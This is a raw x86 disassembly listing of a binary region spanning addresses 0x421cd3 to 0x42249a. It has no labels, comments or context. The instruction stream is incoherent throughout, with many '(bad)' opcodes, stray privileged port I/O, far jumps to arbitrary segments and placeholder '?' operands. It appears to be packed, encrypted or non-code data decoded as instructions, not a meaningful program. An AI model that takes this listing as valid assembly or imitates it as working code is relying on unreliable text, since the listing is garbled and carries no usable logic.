  421cd3:	fisub  WORD PTR ds:0xc4520a80
  421cd9:	(bad)  
  421cdb:	(bad)  
  421cdc:	in     al,0xf1
  421cde:	stc    
  421cdf:	into   
  421ce0:	dec    ebx
  421ce1:	(bad)  
  421ce2:	lock push eax
  421ce4:	pusha  
  421ce5:	out    dx,eax
  421ce6:	pop    ds
  421ce7:	push   edi
  421ce8:	mov    ah,0x2e
  421cea:	jecxz  0x421ce9
  421cec:	cld    
  421ced:	movmskps ecx,xmm1
  421cf0:	pop    ebx
  421cf1:	enter  0xb72a,0x88
  421cf5:	gs jno 0x421d6a
  421cf8:	mov    al,0xee
  421cfa:	dec    ebx
  421cfb:	test   BYTE PTR [esi+0x7d7c968b],dl
  421d01:	inc    esi
  421d02:	jnp    0x421d6c
  421d04:	shr    DWORD PTR [eax],cl
  421d06:	retf   
  421d07:	fs mov edi,0x7ff7e84b
  421d0d:	loop   0x421d4e
  421d0f:	sbb    esi,DWORD PTR [esi+0x2a]
  421d12:	pop    ss
  421d13:	sub    eax,0xbb26be88
  421d18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d19:	mov    eax,0x7537b49a
  421d1e:	int3   
  421d1f:	fwait
  421d20:	jecxz  0x421d47
  421d22:	mov    WORD PTR [edx+0x17cc5399],fs
  421d28:	jbe    0x421cd9
  421d2a:	mov    ds:0xf704b75e,al
  421d2f:	inc    DWORD PTR [esi+0x29]
  421d32:	popf   
  421d33:	pop    ds
  421d34:	into   
  421d35:	mov    al,al
  421d37:	xor    al,0xc3
  421d39:	and    al,0xf6
  421d3b:	pop    edx
  421d3c:	in     eax,dx
  421d3d:	add    BYTE PTR [ebx-0x7c],ah
  421d40:	dec    edi
  421d41:	fistp  DWORD PTR [edi-0x78c5c8]
  421d47:	ret    
  421d48:	retf   
  421d49:	mov    al,0x73
  421d4b:	inc    esi
  421d4c:	jbe    0x421dbf
  421d4e:	push   ss
  421d4f:	jno    0x421dc4
  421d51:	pop    es
  421d52:	fnstsw WORD PTR [ebx+0x17f7ad3e]
  421d58:	mov    ah,0xdd
  421d5a:	out    0xef,eax
  421d5c:	inc    esi
  421d5d:	sbb    BYTE PTR [edi-0x14],0x94
  421d61:	mov    ch,0x2
  421d63:	sub    DWORD PTR [ecx-0x4f3952cc],eax
  421d69:	jnp    0x421d22
  421d6b:	das    
  421d6c:	and    al,0xce
  421d6e:	or     ch,BYTE PTR cs:[ecx-0x59c04e86]
  421d75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d76:	or     BYTE PTR [ebx-0x34eef237],dl
  421d7c:	mov    BYTE PTR [esi],al
  421d7e:	icebp  
  421d7f:	leave  
  421d80:	and    ebx,DWORD PTR [edx]
  421d82:	push   edx
  421d83:	adc    edi,DWORD PTR [ebx]
  421d85:	cmp    DWORD PTR [esi+0x61],eax
  421d88:	adc    esp,esi
  421d8a:	add    al,0xab
  421d8c:	cwde   
  421d8d:	push   ebp
  421d8e:	cld    
  421d8f:	scas   al,BYTE PTR es:[edi]
  421d90:	jo     0x421df4
  421d92:	jnp    0x421d9a
  421d94:	pop    es
  421d95:	xor    BYTE PTR [ebx-0x4da378c2],bl
  421d9b:	mov    ebp,0xb785b06c
  421da0:	sbb    eax,DWORD PTR [edx]
  421da2:	dec    eax
  421da3:	jne    0x421d74
  421da5:	jg     0x421d80
  421da7:	loopne 0x421e17
  421da9:	scas   al,BYTE PTR es:[edi]
  421daa:	jno    0x421db9
  421dac:	mov    al,ds:0xbafbceab
  421db1:	stc    
  421db2:	in     al,0x12
  421db4:	push   ds
  421db5:	lds    esp,FWORD PTR [ebp+esi*4-0x1a]
  421db9:	add    eax,DWORD PTR [ecx-0x5532113b]
  421dbf:	out    dx,al
  421dc0:	ss cmc 
  421dc2:	push   ss
  421dc3:	sbb    dh,BYTE PTR [ecx+edi*1+0x28]
  421dc7:	dec    esp
  421dc8:	and    DWORD PTR [ebx+0x73],ebp
  421dcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421dcc:	mov    al,0x37
  421dce:	lea    ebp,[esi+0x353f1e6e]
  421dd4:	dec    DWORD PTR [esi+eiz*1]
  421dd7:	out    dx,al
  421dd8:	xchg   ecx,eax
  421dd9:	das    
  421dda:	mov    ds:0xbe035134,eax
  421ddf:	dec    ebp
  421de0:	fstp   TBYTE PTR [ebx+0x5356b91e]
  421de6:	test   eax,0xbc0430e4
  421deb:	push   ds
  421dec:	or     eax,0x200e4fe3
  421df1:	and    DWORD PTR [edx+0x76e2483c],0xe033ee0
  421dfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dfc:	outs   dx,DWORD PTR ds:[esi]
  421dfd:	push   0xffffffad
  421dff:	sub    eax,DWORD PTR [ebx+edx*4]
  421e02:	imul   esi,DWORD PTR [esi-0x4f],0xffffffb1
  421e06:	inc    ecx
  421e07:	or     BYTE PTR [edi],al
  421e09:	fsubr  DWORD PTR [ecx]
  421e0b:	xchg   esp,eax
  421e0c:	aaa    
  421e0d:	jg     0x421da2
  421e0f:	xlat   BYTE PTR ds:[ebx]
  421e10:	in     al,dx
  421e11:	add    al,0x54
  421e13:	cld    
  421e14:	hlt    
  421e15:	xor    eax,0xf61c4335
  421e1a:	test   DWORD PTR [eax+0xf3977cb],esi
  421e20:	mov    edi,0xb323762f
  421e25:	adc    DWORD PTR [ebx-0x4d],esp
  421e28:	xchg   DWORD PTR [ebx],esi
  421e2a:	ror    BYTE PTR [eax+0x5103ab31],0xa1
  421e31:	out    dx,al
  421e32:	mov    edi,0xc23d48de
  421e37:	and    al,0x91
  421e39:	add    eax,0x6c381e8f
  421e3e:	push   ebp
  421e3f:	xor    al,ah
  421e41:	or     eax,0x532e795a
  421e46:	and    eax,0xe91e82ec
  421e4b:	cmc    
  421e4c:	dec    ebx
  421e4d:	adc    bl,cl
  421e4f:	imul   ebx,DWORD PTR [eax-0x7],0x60372c5
  421e56:	repz cmp esp,edx
  421e59:	mov    DWORD PTR [eax-0x5454a44d],ebx
  421e5f:	data16 cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  421e62:	sub    BYTE PTR [ebx+0x4d],0x18
  421e66:	cld    
  421e67:	mov    dl,0x4f
  421e69:	add    al,0xf4
  421e6b:	mov    ebx,DWORD PTR [esi]
  421e6d:	and    edi,ecx
  421e6f:	stos   BYTE PTR es:[edi],al
  421e70:	or     edi,eax
  421e72:	loopne 0x421e0f
  421e74:	mov    edi,0xf59c03d2
  421e79:	mov    ebx,0x7c7717f8
  421e7e:	sub    al,BYTE PTR [edi]
  421e80:	ret    0xbba3
  421e83:	out    dx,al
  421e84:	or     cl,dh
  421e86:	push   ds
  421e87:	in     eax,0x1e
  421e89:	cmp    eax,0x923e2dc6
  421e8e:	jo     0x421e5c
  421e90:	sbb    bl,bl
  421e92:	fadd   st,st(0)
  421e94:	pop    ecx
  421e95:	pop    ebx
  421e96:	mov    ds:0xcfc1979e,eax
  421e9b:	call   0x9f93:0xf7526db
  421ea2:	mov    dl,0xe1
  421ea4:	enter  0xc116,0x94
  421ea8:	stos   DWORD PTR es:[edi],eax
  421ea9:	pop    eax
  421eaa:	mov    al,BYTE PTR [edx]
  421eac:	inc    edi
  421ead:	mov    cl,0xd6
  421eaf:	sub    ah,dl
  421eb1:	and    ebx,edx
  421eb3:	jg     0x421f0a
  421eb5:	js     0x421eb1
  421eb7:	dec    esi
  421eb8:	lock cld 
  421eba:	enter  0x8a47,0xf8
  421ebe:	imul   ebx,DWORD PTR [ebx],0x8bd354d5
  421ec4:	xchg   ebp,eax
  421ec5:	add    BYTE PTR [eax+0x72b5b8d2],dl
  421ecb:	mov    bh,0x70
  421ecd:	mov    eax,0x5a8f2a88
  421ed2:	lods   eax,DWORD PTR ds:[esi]
  421ed3:	mov    ecx,0x9ed034c7
  421ed8:	pusha  
  421ed9:	not    BYTE PTR [ebp-0x3225d94d]
  421edf:	dec    eax
  421ee0:	loope  0x421f0d
  421ee2:	aam    0x6c
  421ee4:	push   esi
  421ee5:	sub    DWORD PTR [esi+esi*2],ebp
  421ee8:	jg     0x421ee9
  421eea:	xchg   esp,eax
  421eeb:	jmp    0x4cb3626a
  421ef0:	mov    ds:0xf10aa489,eax
  421ef5:	dec    ecx
  421ef6:	rcl    esi,0x8
  421ef9:	test   BYTE PTR [edi-0x7f],ch
  421efc:	out    dx,eax
  421efd:	push   ds
  421efe:	lea    ecx,[edx+0x14d53d0b]
  421f04:	mov    ebx,0x904cc1c4
  421f09:	sub    esp,DWORD PTR [esi+0x4]
  421f0c:	sbb    BYTE PTR [edi-0x19],al
  421f0f:	inc    eax
  421f10:	(bad)  
  421f11:	aaa    
  421f12:	push   edx
  421f13:	sub    al,BYTE PTR [edi+0x69]
  421f16:	scas   eax,DWORD PTR es:[edi]
  421f17:	push   ss
  421f18:	sti    
  421f19:	into   
  421f1a:	push   0x1a483bd7
  421f1f:	inc    edx
  421f20:	xor    al,0x4a
  421f22:	or     al,0x2e
  421f24:	xor    ebp,edx
  421f26:	bound  esi,QWORD PTR [ecx]
  421f28:	fist   DWORD PTR [ebx-0x6e50a7d2]
  421f2e:	fmulp  st(3),st
  421f30:	aam    0xae
  421f32:	xor    BYTE PTR [ebp-0x2424dd11],0xa3
  421f39:	lods   eax,DWORD PTR ds:[esi]
  421f3a:	inc    edx
  421f3b:	iret   
  421f3c:	cli    
  421f3d:	retf   0x2f98
  421f40:	push   ebp
  421f41:	adc    edi,DWORD PTR [edi+eax*4-0x1611672]
  421f48:	out    0x5c,al
  421f4a:	es int3 
  421f4c:	mov    al,cl
  421f4e:	jge    0x421f49
  421f50:	inc    ecx
  421f51:	test   BYTE PTR [ebx],al
  421f53:	mov    edx,edx
  421f55:	pop    es
  421f56:	push   cs
  421f57:	adc    DWORD PTR [eax+0x72],eax
  421f5a:	mov    eax,0x714c409f
  421f5f:	xchg   ebx,eax
  421f60:	out    dx,al
  421f61:	sub    eax,0x6b52a0d0
  421f66:	inc    edx
  421f67:	sti    
  421f68:	popa   
  421f69:	neg    BYTE PTR [eax]
  421f6b:	jmp    0x421fca
  421f6d:	ret    0x3408
  421f70:	mov    bh,0x70
  421f72:	add    cl,cl
  421f74:	cmp    eax,0x5b05fdff
  421f79:	jge    0x421fc6
  421f7b:	repnz lods al,BYTE PTR ds:[esi]
  421f7d:	jae    0x421f4d
  421f7f:	cdq    
  421f80:	add    ah,BYTE PTR [esi-0x60]
  421f83:	adc    ah,BYTE PTR [ebx-0x22]
  421f86:	sbb    cl,0x62
  421f89:	aas    
  421f8a:	inc    esi
  421f8b:	mov    dl,0x22
  421f8d:	bound  esi,QWORD PTR [eax-0x70]
  421f90:	daa    
  421f91:	add    al,BYTE PTR [ecx+eiz*2+0x4d]
  421f95:	inc    ebp
  421f96:	pop    esi
  421f97:	cwde   
  421f98:	xor    bh,BYTE PTR [esi+edx*4]
  421f9b:	push   es
  421f9c:	fnstenv [esi+0x42764579]
  421fa2:	cli    
  421fa3:	mov    esp,0x74396420
  421fa8:	stos   BYTE PTR es:[edi],al
  421fa9:	adc    BYTE PTR fs:[ebp-0x6e],dh
  421fad:	not    BYTE PTR [ecx+eax*4-0x3b93c91b]
  421fb4:	jae    0x421fb8
  421fb6:	aam    0x72
  421fb8:	and    BYTE PTR [edi],cl
  421fba:	lods   al,BYTE PTR ds:[esi]
  421fbb:	mov    ds:0x2ae77fc1,al
  421fc0:	mov    bh,0x4e
  421fc2:	pop    ebp
  421fc3:	jl     0x42203a
  421fc5:	sahf   
  421fc6:	jno    0x421f8e
  421fc8:	pop    ss
  421fc9:	sub    esi,DWORD PTR [ebp+0x8e76389]
  421fcf:	xor    eax,DWORD PTR [esi-0x491e80be]
  421fd5:	(bad)  
  421fd6:	rol    BYTE PTR [ebp+0x752807ca],0xcb
  421fdd:	mov    ah,0x5c
  421fdf:	sub    BYTE PTR [edi],bh
  421fe1:	mov    dh,0xa0
  421fe3:	xchg   edx,eax
  421fe4:	cmp    DWORD PTR [ecx+0x2568352d],edi
  421fea:	jl     0x421fd8
  421fec:	dec    esi
  421fed:	jns    0x421f87
  421fef:	iret   
  421ff0:	adc    ah,al
  421ff2:	rcr    BYTE PTR [ebx-0x42],1
  421ff5:	retf   0xd427
  421ff8:	test   DWORD PTR ds:0x3ecc9e88,esi
  421ffe:	jl     0x42205c
  422000:	cmp    al,0x5b
  422002:	scas   ax,WORD PTR es:[edi]
  422004:	cwde   
  422005:	sub    bl,BYTE PTR [esi]
  422007:	jp     0x422014
  422009:	add    al,0x64
  42200b:	dec    eax
  42200c:	test   BYTE PTR [ebx+0x51966a58],bl
  422012:	sbb    dh,bh
  422014:	lds    edx,FWORD PTR [ecx]
  422016:	sub    BYTE PTR [ecx+0x5b],bl
  422019:	mov    bl,0x85
  42201b:	aam    0x31
  42201d:	push   ebp
  42201e:	(bad)  
  42201f:	sar    BYTE PTR [esi],1
  422021:	aad    0x16
  422023:	xor    eax,DWORD PTR [eax-0x67]
  422026:	mov    edx,esp
  422028:	outs   dx,DWORD PTR ds:[esi]
  422029:	add    ebp,eax
  42202b:	lock clc 
  42202d:	xor    DWORD PTR [esi-0x4892a329],0xffffffa4
  422034:	inc    edx
  422035:	jbe    0x421fdb
  422037:	test   BYTE PTR [edx-0x4f],ah
  42203a:	pushf  
  42203b:	sti    
  42203c:	fld    DWORD PTR [eax+eiz*1-0x442c4366]
  422043:	sub    eax,0x3fd57646
  422048:	jmp    0x421fe1
  42204a:	arpl   WORD PTR [esi],bp
  42204c:	dec    esi
  42204d:	sahf   
  42204e:	cmp    bl,ah
  422050:	inc    eax
  422051:	sbb    al,0x90
  422053:	push   0x1e
  422055:	mov    ecx,0x86d121e5
  42205a:	out    0x29,eax
  42205c:	scas   eax,DWORD PTR es:[edi]
  42205d:	dec    esi
  42205e:	add    eax,0xc531097a
  422063:	sub    eax,0xe7b3e026
  422068:	xchg   ecx,eax
  422069:	out    dx,eax
  42206a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42206b:	inc    edx
  42206c:	pop    edi
  42206d:	lods   al,BYTE PTR ds:[esi]
  42206e:	inc    esi
  42206f:	loop   0x42203a
  422071:	rcl    esp,cl
  422073:	(bad)  
  422075:	cmp    ebx,DWORD PTR [ebp+eax*8-0x27]
  422079:	jo     0x422012
  42207b:	div    BYTE PTR es:[eax+0x12]
  42207f:	and    ah,bh
  422081:	adc    BYTE PTR ds:0xa3311050,dh
  422087:	cmovnp edx,DWORD PTR [esi-0x4dafeee9]
  42208e:	inc    ebp
  42208f:	adc    BYTE PTR [ebp-0x6969e4e1],dh
  422095:	jmp    0x1e2:0xdd995307
  42209c:	jmp    0x4220ca
  42209e:	pusha  
  42209f:	mov    ch,0xc0
  4220a1:	and    al,0xc7
  4220a3:	clc    
  4220a4:	push   edx
  4220a5:	push   esi
  4220a6:	push   ss
  4220a7:	test   BYTE PTR [esp+eax*4-0x75],al
  4220ab:	aad    0x8e
  4220ad:	jnp    0x422067
  4220af:	xor    edi,ebp
  4220b1:	jnp    0x42205e
  4220b3:	in     al,0x39
  4220b5:	loope  0x4220bc
  4220b7:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4220b9:	xor    al,0x72
  4220bb:	loopne 0x422071
  4220bd:	pop    es
  4220be:	add    esi,DWORD PTR [eax-0x70]
  4220c1:	dec    edi
  4220c2:	sbb    edi,DWORD PTR [edx+0x54]
  4220c5:	add    DWORD PTR [edi],ebx
  4220c7:	or     bl,BYTE PTR [eax+ecx*8+0x21]
  4220cb:	pusha  
  4220cc:	loope  0x42207c
  4220ce:	cmp    al,0x77
  4220d0:	(bad)  
  4220d1:	ss mov ds:0x3fe4a63a,eax
  4220d8:	iret   
  4220d9:	test   eax,0xf28c97b0
  4220de:	mov    eax,ds:0x34def1eb
  4220e3:	sub    dl,bl
  4220e5:	sub    al,0x69
  4220e7:	pop    esi
  4220e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220e9:	into   
  4220ea:	add    ebx,ecx
  4220ec:	push   0x2b3613bc
  4220f1:	adc    al,0xff
  4220f3:	mov    ecx,esi
  4220f5:	mov    ?,WORD PTR [edi+0x5]
  4220f8:	xchg   edx,eax
  4220f9:	popf   
  4220fa:	lds    esi,FWORD PTR [edx-0x2cba0551]
  422100:	in     al,0x7e
  422102:	gs sbb al,0xe
  422105:	push   eax
  422106:	cmp    eax,0xd1523fd4
  42210b:	mov    fs,WORD PTR [esi-0x17]
  42210e:	out    0xf2,eax
  422110:	push   esp
  422111:	(bad)  
  422112:	(bad)  
  422113:	sbb    eax,0xa7c3bb27
  422118:	sbb    ebp,eax
  42211a:	pop    esi
  42211b:	(bad)  
  42211c:	loopne 0x4220f6
  42211e:	or     BYTE PTR [edi-0x12],cl
  422121:	test   al,0x29
  422123:	imul   esi,DWORD PTR [ebx],0xc064c055
  422129:	jns    0x42212e
  42212b:	in     eax,dx
  42212c:	imul   edi,DWORD PTR [ecx+esi*2+0x22],0xffffff8e
  422131:	ret    0x248e
  422134:	enter  0xa58f,0x6c
  422138:	or     al,0x5b
  42213a:	xlat   BYTE PTR ds:[ebx]
  42213b:	mov    gs,ebx
  42213d:	pop    ebx
  42213e:	rcr    DWORD PTR [edx+0x59],1
  422141:	push   eax
  422142:	out    dx,eax
  422143:	fsub   st(2),st
  422145:	arpl   WORD PTR [ecx+0x3d],cx
  422148:	gs cdq 
  42214a:	xor    ch,BYTE PTR [esi]
  42214c:	repz pop es
  42214e:	push   ecx
  42214f:	cmp    DWORD PTR [esi+0xfeb07b0],0xffffff90
  422156:	sub    al,0x3c
  422158:	jmp    0xe43422fe
  42215d:	adc    DWORD PTR [ebp-0x502cb553],ecx
  422163:	and    dh,BYTE PTR [edi]
  422165:	int    0x2e
  422167:	adc    eax,esi
  422169:	les    ebx,FWORD PTR [eax+0x6b]
  42216c:	aas    
  42216d:	or     al,0xe3
  42216f:	ret    0x8a10
  422172:	retf   
  422173:	icebp  
  422174:	aaa    
  422175:	mov    eax,0x14a657b4
  42217a:	cmp    esp,0xffffffb7
  42217d:	stc    
  42217e:	in     al,dx
  42217f:	xchg   ecx,eax
  422180:	adc    al,0x54
  422182:	add    ch,ah
  422184:	pop    eax
  422185:	sbb    DWORD PTR [ebx+ebp*1+0x5ad22baf],ecx
  42218c:	jg     0x422204
  42218e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42218f:	mov    al,0x7d
  422191:	sbb    DWORD PTR [ecx-0x529644a3],eax
  422197:	bound  ecx,QWORD PTR [esp+edi*4+0x317c5517]
  42219e:	cli    
  42219f:	sub    DWORD PTR [edx+0x75],ebx
  4221a2:	inc    ebx
  4221a3:	push   DWORD PTR [eax+esi*1-0x51]
  4221a7:	les    esp,FWORD PTR [edx*4+0x7a07742e]
  4221ae:	inc    edx
  4221af:	xchg   esi,eax
  4221b0:	lock mov esi,esp
  4221b3:	inc    edi
  4221b4:	cmp    bl,dl
  4221b6:	in     eax,0x9a
  4221b8:	mov    eax,ds:0xfebd847f
  4221bd:	rol    DWORD PTR [edx-0x43fe3e24],1
  4221c3:	imul   esp,DWORD PTR [edi+ebx*2-0x4c],0xb5d50b0
  4221cb:	jmp    0x3d329b84
  4221d0:	mov    cl,0x58
  4221d2:	ror    BYTE PTR [edx-0x3387d8a5],cl
  4221d8:	jae    0x42221f
  4221da:	je     0x422208
  4221dc:	inc    ebx
  4221dd:	sbb    esp,edx
  4221df:	xchg   ebp,eax
  4221e0:	and    esi,ebp
  4221e2:	inc    esi
  4221e3:	inc    ecx
  4221e4:	mov    ds:0x5cbd705d,eax
  4221e9:	push   0x13fcd5e9
  4221ee:	(bad)  
  4221ef:	push   ecx
  4221f0:	jle    0x42220a
  4221f2:	pushf  
  4221f3:	push   DWORD PTR [edi+0x306f154]
  4221f9:	out    dx,al
  4221fa:	push   0x3bf4d43
  4221ff:	or     DWORD PTR [ecx-0xaa10fde],ebx
  422205:	pop    ebp
  422206:	fimul  DWORD PTR [ebx+esi*8]
  422209:	imul   eax,ebx,0x60fcfa4a
  42220f:	push   edi
  422210:	add    eax,0x767da056
  422215:	lds    ecx,FWORD PTR [ebp+eax*1-0x6e89fc93]
  42221c:	fldcw  WORD PTR [ebx+edx*8-0x33ecc4b8]
  422223:	jmp    0xd87d:0x80dce2e7
  42222a:	push   cs
  42222b:	js     0x42221c
  42222d:	sbb    edi,ebx
  42222f:	push   cs
  422230:	mov    esi,0xb7a1e06a
  422235:	sar    dl,cl
  422237:	sub    eax,0xae8ce71b
  42223c:	dec    ebp
  42223d:	(bad)  
  42223e:	loop   0x42221a
  422240:	ins    DWORD PTR es:[edi],dx
  422241:	xchg   ebx,eax
  422242:	jmp    0x422249
  422244:	sub    ecx,edx
  422246:	push   0x177ecce4
  42224b:	cdq    
  42224c:	push   eax
  42224d:	fist   WORD PTR [edi]
  42224f:	aas    
  422250:	sub    BYTE PTR [ebx-0x25],bh
  422253:	dec    ebp
  422254:	adc    dh,BYTE PTR [edi+0x1f789c]
  42225a:	jp     0x42220c
  42225c:	mov    ecx,0xb7693044
  422261:	les    esi,FWORD PTR [edi]
  422263:	add    esi,DWORD PTR [esi]
  422265:	ja     0x4222e0
  422267:	jne    0x422214
  422269:	and    ch,dh
  42226b:	lock test al,0x7c
  42226e:	sbb    ebp,DWORD PTR [eax]
  422270:	imul   esp,eax,0xffffffe4
  422273:	out    dx,al
  422274:	jb     0x4222dd
  422276:	sbb    esi,ebx
  422278:	js     0x4221fe
  42227a:	loop   0x422204
  42227c:	ret    
  42227d:	jo     0x4222b3
  42227f:	in     eax,dx
  422280:	jge    0x4222ca
  422282:	pop    esi
  422283:	(bad)  
  422284:	out    0x44,eax
  422286:	fsub   st(6),st
  422288:	(bad)  
  42228a:	jbe    0x4222d9
  42228c:	mov    ebp,0x3889709d
  422291:	clc    
  422292:	addr16 mov al,0x16
  422295:	sbb    eax,0x77bf24e4
  42229a:	outs   dx,DWORD PTR ds:[esi]
  42229b:	data16 mov ch,0x2c
  42229e:	js     0x42230c
  4222a0:	mov    dl,0x11
  4222a2:	repnz or DWORD PTR cs:[edi],esp
  4222a6:	scas   al,BYTE PTR es:[edi]
  4222a7:	rcl    DWORD PTR [ecx-0x9],0xcd
  4222ab:	popf   
  4222ac:	jecxz  0x422326
  4222ae:	pop    ds
  4222af:	add    eax,0xbc124c3b
  4222b4:	add    ah,cl
  4222b6:	or     eax,eax
  4222b8:	(bad)  
  4222ba:	mov    eax,ds:0x5bddb34e
  4222bf:	add    DWORD PTR [esi+0x78],eax
  4222c2:	cmp    DWORD PTR [edi+0x3a],esi
  4222c5:	push   edx
  4222c6:	aad    0xa2
  4222c8:	(bad)  
  4222c9:	jp     0x8ef50051
  4222cf:	dec    esi
  4222d0:	mov    ah,0x19
  4222d2:	and    BYTE PTR [ebp+esi*1-0x35bd8d42],al
  4222d9:	and    dl,BYTE PTR [ebp-0x42]
  4222dc:	out    dx,eax
  4222dd:	push   esp
  4222de:	or     eax,0x5b4b1ff6
  4222e3:	daa    
  4222e4:	icebp  
  4222e5:	(bad)  
  4222e6:	call   0xc573cf0f
  4222eb:	push   eax
  4222ec:	inc    ebx
  4222ed:	push   ss
  4222ee:	ror    esp,0xac
  4222f1:	jbe    0x42235d
  4222f3:	inc    ecx
  4222f4:	outs   dx,BYTE PTR ds:[esi]
  4222f5:	push   ebp
  4222f6:	mov    al,0xa6
  4222f8:	shl    DWORD PTR [ecx+0x1ed5ebff],0x6c
  4222ff:	fs out dx,al
  422301:	fcomi  st,st(0)
  422303:	jl     0x422306
  422305:	jnp    0x4222b5
  422307:	(bad)  
  422308:	pusha  
  422309:	xor    al,0xa3
  42230b:	mov    dh,0xbd
  42230d:	retf   0xd9a6
  422310:	pop    ebx
  422311:	mov    al,ds:0x957c3b0e
  422316:	push   esp
  422317:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422318:	lods   al,BYTE PTR ds:[esi]
  422319:	ss dec eax
  42231b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42231c:	idiv   ebp
  42231e:	sub    edx,DWORD PTR [edi-0xd]
  422321:	xor    DWORD PTR [ecx+esi*2+0x1c],edx
  422325:	lods   eax,DWORD PTR ds:[esi]
  422326:	pop    edx
  422327:	fcmovb st,st(7)
  422329:	mov    ?,eax
  42232b:	adc    cl,BYTE PTR [ebp+0x3d]
  42232e:	divps  xmm2,xmm5
  422331:	pop    ecx
  422332:	leave  
  422333:	mov    ah,0x52
  422335:	sub    DWORD PTR [ebp+eax*1+0x74],esi
  422339:	mov    al,0xcb
  42233b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42233c:	pop    ds
  42233d:	pop    ebp
  42233e:	lock or BYTE PTR [esi],0x65
  422342:	mov    WORD PTR [ebp+0x4d],cs
  422345:	mov    dh,0xf9
  422347:	push   ebp
  422348:	jp     0x422324
  42234a:	sub    ebx,0x9bb95282
  422350:	call   0x333e5ca6
  422355:	nop
  422356:	pop    ebp
  422357:	and    bh,BYTE PTR [edx-0x58]
  42235a:	hlt    
  42235b:	push   es
  42235c:	mov    ebx,0x915b95ac
  422361:	xchg   ebp,eax
  422362:	dec    eax
  422363:	xor    DWORD PTR [ebp-0x1a],0xc7f838e7
  42236a:	into   
  42236b:	mov    ebx,0xac4e355c
  422370:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422371:	test   BYTE PTR [edx+0x259a7785],al
  422377:	loope  0x422366
  422379:	arpl   WORD PTR [ecx-0x3b],bp
  42237c:	imul   edi,DWORD PTR [ebx],0xe9135217
  422382:	inc    ebx
  422383:	ds sbb eax,0x9d35eff7
  422389:	jae    0x422401
  42238b:	bound  ecx,QWORD PTR [esi+0x2d]
  42238e:	loope  0x422403
  422390:	xor    DWORD PTR [ecx+eax*4],ecx
  422393:	int3   
  422394:	dec    esp
  422395:	out    dx,eax
  422396:	ins    DWORD PTR es:[edi],dx
  422397:	test   eax,0xbb0c1b4a
  42239c:	pusha  
  42239d:	xor    dl,BYTE PTR [ecx+esi*1]
  4223a0:	fwait
  4223a1:	dec    esi
  4223a2:	inc    eax
  4223a3:	in     eax,dx
  4223a4:	pop    esp
  4223a5:	dec    eax
  4223a6:	std    
  4223a7:	mov    ebp,0x6486f927
  4223ac:	push   cs
  4223ad:	aaa    
  4223ae:	stos   DWORD PTR es:[edi],eax
  4223af:	add    DWORD PTR [edi-0xfba195],0xfffffff3
  4223b6:	pop    esp
  4223b7:	call   0xfc32:0xa14b93d3
  4223be:	push   cs
  4223bf:	pop    ds
  4223c0:	and    cl,BYTE PTR [ebx+0x31]
  4223c3:	idiv   BYTE PTR [esp+ebx*1-0x5a]
  4223c7:	pop    es
  4223c8:	jns    0x422380
  4223ca:	jmp    0x42241b
  4223cc:	add    ecx,DWORD PTR [edx]
  4223ce:	dec    ecx
  4223cf:	lods   eax,DWORD PTR ds:[esi]
  4223d0:	xchg   edx,eax
  4223d1:	js     0x4223de
  4223d3:	and    al,0xeb
  4223d5:	jno    0x422402
  4223d7:	xchg   ecx,eax
  4223d8:	gs xchg ecx,eax
  4223da:	inc    edx
  4223db:	nop
  4223dc:	and    al,0xd0
  4223de:	dec    esp
  4223df:	adc    al,0x8c
  4223e1:	mov    ebp,0xa79fd579
  4223e6:	mov    edx,esp
  4223e8:	sbb    eax,0xc062c4a9
  4223ed:	add    ebx,DWORD PTR [eax-0x7247ed4c]
  4223f3:	push   es
  4223f4:	sbb    BYTE PTR [edi+0x33],cl
  4223f7:	inc    ebx
  4223f8:	mov    eax,ds:0x9b419ea6
  4223fd:	iret   
  4223fe:	push   ebp
  4223ff:	test   cl,cl
  422401:	jns    0x422404
  422403:	cli    
  422404:	cmp    DWORD PTR [ecx+0x27],ebp
  422407:	out    dx,al
  422408:	fadd   DWORD PTR [edx+0x4fd0a34c]
  42240e:	or     BYTE PTR [esi-0xa],dl
  422411:	xlat   BYTE PTR ds:[ebx]
  422412:	out    0x41,eax
  422414:	mov    esp,0x31c0e68e
  422419:	mov    ebp,0x4b604e1f
  42241e:	retf   
  42241f:	imul   esi,DWORD PTR [ebp+eax*8-0x3],0x3b27248e
  422427:	aad    0x60
  422429:	xchg   esp,eax
  42242a:	dec    edx
  42242b:	add    ebx,edx
  42242d:	rcr    BYTE PTR [eax-0x4b],1
  422430:	(bad)  
  422431:	sub    bh,dl
  422433:	add    eax,0x5d010247
  422438:	add    dh,BYTE PTR [esi]
  42243a:	cmp    ebp,edi
  42243c:	pop    edx
  42243d:	or     esi,DWORD PTR [ebp+0x770d7512]
  422443:	cmc    
  422444:	prefetch BYTE PTR [esi+0x5cbb7306]
  42244b:	or     eax,0x11a82a9b
  422450:	xchg   esi,eax
  422451:	shr    DWORD PTR ds:0xb690e100,1
  422457:	clc    
  422458:	fidivr DWORD PTR [esi]
  42245a:	mov    DWORD PTR [ebx+0x635bfe2],ecx
  422460:	adc    eax,0xfb7dd747
  422465:	jecxz  0x422424
  422467:	es aad 0xc
  42246a:	xor    ebx,esi
  42246c:	imul   ebp,esp,0xfffffff1
  42246f:	das    
  422470:	hlt    
  422471:	jb     0x422496
  422473:	retf   
  422474:	adc    ebp,ecx
  422476:	pop    ebp
  422477:	sub    eax,0x9d46f319
  42247c:	and    edx,esp
  42247e:	das    
  42247f:	push   esi
  422480:	push   ebx
  422481:	push   ecx
  422482:	adc    dh,BYTE PTR [ecx+0x4e]
  422485:	adc    edx,edi
  422487:	imul   esp,DWORD PTR [eax+ebx*4+0x16],0x8e240fdc
  42248f:	or     eax,0xe9e8481d
  422494:	or     DWORD PTR [ecx+0x2],ecx
  422497:	rcl    BYTE PTR [ecx],0x6d
  42249a:	lock xor eax,0x54ed8f46
